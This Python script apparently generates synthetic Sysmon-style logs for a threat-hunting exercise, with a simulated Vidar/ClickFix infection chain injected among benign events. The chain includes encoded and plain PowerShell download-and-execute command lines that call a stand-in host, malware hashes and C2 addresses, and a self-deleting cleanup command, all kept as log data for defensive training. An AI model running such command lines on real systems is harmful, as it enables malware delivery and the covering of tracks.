#!/usr/bin/env python3
"""Generate SIMULATED Sysmon-style telemetry (ECS-like field names) for the Week 5 hunt.
Benign background noise + a small injected Vidar/ClickFix-like chain.
All data is synthetic - no real malware is used or executed."""
import json, random, argparse
from datetime import datetime, timedelta

random.seed(42)
ap = argparse.ArgumentParser()
ap.add_argument("--out", default="logs/sim_sysmon.ndjson")
ap.add_argument("--benign", type=int, default=3000)
args = ap.parse_args()

import os
os.makedirs(os.path.dirname(args.out), exist_ok=True)

START = datetime(2026, 10, 5, 8, 0, 0)
HOSTS = [f"WS-{i:02d}" for i in range(1, 9)]
USERS = ["aigerim", "daulet", "madina", "ruslan", "admin.it"]
SHA_VIDAR = "e93511363f7781c4c7ff3ed0698db6c4634092fe7e93ca96d666509a9412e73e"  # from Week 2 (MalwareBazaar)
C2_IP = "195.201.250.209"   # high-confidence c2_ip from our dataset (31.59.44.104 is only a low-confidence candidate)
CAND_IP = "31.59.44.104"    # Week 2 Shodan candidate (to_ids=False)
DIST_DOMAIN = "win11install.com"  # distribution_domain from our dataset

def ts(minutes): return (START + timedelta(minutes=minutes, seconds=random.randint(0, 59))).isoformat() + "Z"

def proc(code, host, user, name, cmd, parent, pcmd="", sha=None, minutes=0):
    d = {"@timestamp": ts(minutes), "event": {"code": str(code), "dataset": "sysmon"},
         "host": {"name": host}, "user": {"name": user},
         "process": {"name": name, "command_line": cmd, "parent": {"name": parent, "command_line": pcmd}}}
    if sha: d["file"] = {"hash": {"sha256": sha}}
    return d

def dns(host, user, name, qname, minutes):
    return {"@timestamp": ts(minutes), "event": {"code": "22", "dataset": "sysmon"}, "host": {"name": host},
            "user": {"name": user}, "process": {"name": name}, "dns": {"question": {"name": qname}}}

def net(host, user, name, ip, port, minutes):
    return {"@timestamp": ts(minutes), "event": {"code": "3", "dataset": "sysmon"}, "host": {"name": host},
            "user": {"name": user}, "process": {"name": name}, "destination": {"ip": ip, "port": port}}

events = []
benign_cmds = [
    ("chrome.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe"', "explorer.exe"),
    ("msedge.exe", r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"', "explorer.exe"),
    ("powershell.exe", "powershell.exe -NoProfile -File C:\\IT\\inventory.ps1", "svchost.exe"),
    ("powershell.exe", "powershell.exe Get-Process", "cmd.exe"),
    ("cmd.exe", "cmd.exe /c ipconfig /all", "explorer.exe"),
    ("Teams.exe", r'"C:\Users\x\AppData\Local\Microsoft\Teams\current\Teams.exe"', "explorer.exe"),
    ("Code.exe", r'"C:\Users\x\AppData\Local\Programs\Microsoft VS Code\Code.exe"', "explorer.exe"),
]
benign_dns = ["google.com", "microsoft.com", "github.com", "office.com", "steamcommunity.com", "t.me"]
for _ in range(args.benign):
    h, u = random.choice(HOSTS), random.choice(USERS)
    m = random.randint(0, 600)
    k = random.random()
    if k < 0.6:
        n, c, p = random.choice(benign_cmds)
        events.append(proc(1, h, u, n, c, p, minutes=m))
    elif k < 0.9:
        # browsers legitimately resolve t.me / steamcommunity.com sometimes
        proc_name = random.choice(["chrome.exe", "msedge.exe", "Steam.exe", "Telegram.exe"])
        events.append(dns(h, u, proc_name, random.choice(benign_dns), m))
    else:
        events.append(net(h, u, random.choice(["chrome.exe", "msedge.exe"]), f"142.250.{random.randint(1,254)}.{random.randint(1,254)}", 443, m))

# Injected attack chain on WS-04 (user 'madina'), ClickFix-like: Run dialog -> PowerShell -> payload in %TEMP% -> DDR -> C2
h, u, t0 = "WS-04", "madina", 300
payload = r"C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe"
events += [
    proc(1, h, u, "powershell.exe",
         "powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcAApAA==",
         "explorer.exe", "C:\\Windows\\Explorer.EXE", minutes=t0),
    proc(1, h, u, "powershell.exe",
         "powershell.exe -c iex (irm https://example.invalid/update.ps1)",
         "powershell.exe", minutes=t0 + 1),
    proc(1, h, u, "lf3t32pa.exe", payload, "powershell.exe", sha=SHA_VIDAR, minutes=t0 + 2),
    dns(h, u, "chrome.exe", DIST_DOMAIN, t0 - 1),
    dns(h, u, "lf3t32pa.exe", "telegram.me", t0 + 3),
    dns(h, u, "lf3t32pa.exe", "steamcommunity.com", t0 + 3),
    net(h, u, "lf3t32pa.exe", CAND_IP, 80, t0 + 4),
    net(h, u, "lf3t32pa.exe", C2_IP, 443, t0 + 5),
    proc(1, h, u, "cmd.exe", r'cmd.exe /c timeout /t 5 & del "C:\Users\madina\AppData\Local\Temp\lf3t32pa.exe"', "lf3t32pa.exe", minutes=t0 + 6),
]
# A benign admin encoded-command (false positive to discuss in tuning)
events.append(proc(1, "WS-02", "admin.it", "powershell.exe",
                   "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAbwBrACcA",
                   "ccmexec.exe", minutes=120))

events.sort(key=lambda e: e["@timestamp"])
with open(args.out, "w") as f:
    for e in events: f.write(json.dumps(e) + "\n")
print(f"[+] wrote {len(events)} events -> {args.out}")
